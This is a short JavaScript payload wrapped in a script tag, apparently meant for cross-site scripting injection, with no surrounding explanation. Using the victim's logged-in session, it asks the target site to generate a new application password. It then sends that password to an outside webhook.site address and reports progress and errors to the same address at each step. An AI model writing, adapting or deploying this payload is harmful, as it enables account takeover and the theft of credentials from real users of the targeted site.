<script>
(async () => {
  await fetch("https://webhook.site/8c3eac76-d767-40eb-adc2-965bf69d0e82?step=1_js_executed");
 
  try {
    const res = await fetch("/generate_app_password", {
      method: "POST",
      credentials: "include",
      headers: {
        "X-Requested-With": "XMLHttpRequest"
      }
    });
 
    await fetch("https://webhook.site/8c3eac76-d767-40eb-adc2-965bf69d0e82?step=2_status_" + res.status);
 
    const data = await res.json();
    if (data && data.app_password) {
      await fetch("https://webhook.site/8c3eac76-d767-40eb-adc2-965bf69d0e82?step=3_pw_" + encodeURIComponent(data.app_password));
    } else {
      await fetch("https://webhook.site/8c3eac76-d767-40eb-adc2-965bf69d0e82?step=3_no_pw_in_response");
    }
 
  } catch (e) {
    await fetch("https://webhook.site/8c3eac76-d767-40eb-adc2-965bf69d0e82?step=4_error_" + encodeURIComponent(e.message));
  }
})();
</script>
